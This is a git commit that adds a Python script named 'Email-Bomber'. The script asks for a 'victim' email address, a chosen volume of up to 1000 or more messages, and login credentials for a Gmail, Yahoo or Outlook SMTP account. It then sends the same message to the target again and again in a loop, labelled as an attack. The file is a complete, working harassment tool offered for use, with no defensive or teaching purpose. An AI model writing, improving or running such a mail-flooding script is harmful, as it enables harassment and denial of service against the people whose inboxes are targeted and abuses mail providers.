666d44c42e2e73a4571ba3acc9eae9940e0ea89a
alnesef <54684166+alnesef@users.noreply.github.com>
2020-06-01 10:19:03 +0300

    Add files via upload

---
+++ Email_Spammer.py
@@ -0,0 +1,126 @@
+'''imports'''
+import smtplib
+import sys
+
+
+class bcolors:
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+
+
+def banner():
+    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
+    print(bcolors.GREEN + '+[+[+[ Made by: Quessts ]+]+]+')
+    print(bcolors.GREEN + '''
+                     \|/
+                       `--+--'
+                          |
+                      ,--'#`--.
+                      |#######|
+                   _.-'#######`-._
+                ,-'###############`-.
+              ,'#####################`,         .___     .__         .
+             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
+            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
+           |#############################|
+           |#############################|              Owner: @Quessts
+           |#############################|              YouTube.com/Quessts        
+            |###########################|               
+             \#########################/
+              `.#####################,'
+                `._###############_,'
+                   `--..#####..--'                                 ,-.--.
+*.______________________________________________________________,' (Bom )
+                                                                    `--' ''')
+
+
+class Email_Bomber:
+    count = 0
+
+    def __init__(self):
+        try:
+            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
+            self.target = str(input(bcolors.GREEN + 'Email of victim <: '))
+            self.mode = int(input(bcolors.GREEN + 'Choose option (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(Choose yourself) <: '))
+            if int(self.mode) > int(4) or int(self.mode) < int(1):
+                print('ERROR: Invalid Option. GoodBye.')
+                sys.exit(1)
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def bomb(self):
+        try:
+            print(bcolors.RED + '\n+[+[+[ Making spammer ready ]+]+]+')
+            self.amount = None
+            if self.mode == int(1):
+                self.amount = int(1000)
+            elif self.mode == int(2):
+                self.amount = int(500)
+            elif self.mode == int(3):
+                self.amount = int(250)
+            else:
+                self.amount = int(input(bcolors.GREEN + 'Choose an amount <: '))
+            print(bcolors.RED + f'\n+[+[+[ You chose {self.mode} and {self.amount} emails ]+]+]+')
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def email(self):
+        try:
+            print(bcolors.RED + '\n+[+[+[ Readying emails ]+]+]+')
+            self.server = str(input(bcolors.GREEN + 'Enter your mail server | or choose one of these servers - 1:Gmail 2:Yahoo 3:Outlook <: '))
+            premade = ['1', '2', '3']
+            default_port = True
+            if self.server not in premade:
+                default_port = False
+                self.port = int(input(bcolors.GREEN + 'Enter a port <: '))
+
+            if default_port == True:
+                self.port = int(587)
+
+            if self.server == '1':
+                self.server = 'smtp.gmail.com'
+            elif self.server == '2':
+                self.server = 'smtp.mail.yahoo.com'
+            elif self.server == '3':
+                self.server = 'smtp-mail.outlook.com'
+
+            self.fromAddr = str(input(bcolors.GREEN + 'Which email should it come from? <: '))
+            self.fromPwd = str(input(bcolors.GREEN + 'Enter this emails password <: '))
+            self.subject = str(input(bcolors.GREEN + 'Email subject <: '))
+            self.message = str(input(bcolors.GREEN + 'Email message <: '))
+
+            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
+            ''' % (self.fromAddr, self.target, self.subject, self.message)
+
+            self.s = smtplib.SMTP(self.server, self.port)
+            self.s.ehlo()
+            self.s.starttls()
+            self.s.ehlo()
+            self.s.login(self.fromAddr, self.fromPwd)
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def send(self):
+        try:
+            self.s.sendmail(self.fromAddr, self.target, self.msg)
+            self.count +=1
+            print(bcolors.YELLOW + f'BOM: {self.count}')
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def attack(self):
+        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
+        for email in range(self.amount+1):
+            self.send()
+        self.s.close()
+        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+        sys.exit(0)
+
+
+if __name__=='__main__':
+    banner()
+    bomb = Email_Bomber()
+    bomb.bomb()
+    bomb.email()
+    bomb.attack()
